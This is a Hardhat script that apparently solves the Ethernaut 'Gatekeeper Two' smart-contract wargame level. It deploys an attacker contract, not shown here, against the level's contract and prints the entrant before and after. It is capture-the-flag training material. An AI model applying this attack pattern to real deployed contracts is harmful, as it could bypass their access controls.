/*
Things that might help:
Remember what you've learned from getting past the first gatekeeper - the first gate is the same.
The assembly keyword in the second gate allows a contract to access functionality that is not native to vanilla Solidity. See here for more information. The extcodesize call in this gate will get the size of a contract's code at a given address - you can learn more about how and when this is set in section 7 of the yellow paper.
The ^ character in the third gate is a bitwise operation (XOR), and is used here to apply another common bitwise operation (see here). The Coin Flip level is also a good place to start when approaching this challenge.
*/

const hre = require("hardhat");

async function main() {
  // Recreating the attack on ganache
  [player] = await ethers.getSigners();

  // Get an instance of the contract deployed by Ethernaut
  const GatekeeperTwo = "0xF3443d4512fB84cA152Efd35ce93ebd2583cD446"
  this.gateKeeperTwo = await hre.ethers.getContractAt("GatekeeperTwo",GatekeeperTwo);


  console.log(
    `
    \n\n Before the Attack ... \n
    GateKeeper contract address ${await this.gateKeeperTwo.address} \n
    Entrant: ${await this.gateKeeperTwo.entrant()}
    `
  );

  // The GatekeeperTwo contract will perform the attack at the deployment time!
  // The attack will be initiated from the constructor of the GatekeeperTwo contract
  
  console.log("\n\n Performing attack ... \n");
  
  // Deploying the GatekeeperTwoAttacker contract
  const GatekeeperTwoAttacker = await hre.ethers.getContractFactory("GatekeeperTwoAttacker");
  this.gateKeeperTwoAttacker = await GatekeeperTwoAttacker.connect(player).deploy(this.gateKeeperTwo.address);
  await this.gateKeeperTwoAttacker.deployed();

  console.log("\n===============================================\n===============================================\n");
  console.log("\n\n Results after performing the attack \n");

  console.log(
    `
    GateKeeper contract address ${await this.gateKeeperTwo.address} \n
    Entrant: ${await this.gateKeeperTwo.entrant()}
    `
  );

  console.log("\n\n ========================== Attack Completed!!!! ==========================");

}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});